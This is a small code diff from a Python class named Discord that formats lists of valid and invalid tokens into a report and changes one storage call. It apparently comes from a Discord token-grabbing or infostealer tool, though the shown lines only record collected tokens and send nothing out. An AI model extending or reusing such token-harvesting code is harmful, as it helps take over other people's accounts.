@@ -118,7 +118,7 @@ class Discord:
             "Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n" + "".join(item for item in temp)
         )
 
-        self.__storage.add_data("Discord", True)
+        self.__storage.add_data("Application", "Discord")
 
     def run(self) -> Data:
         """
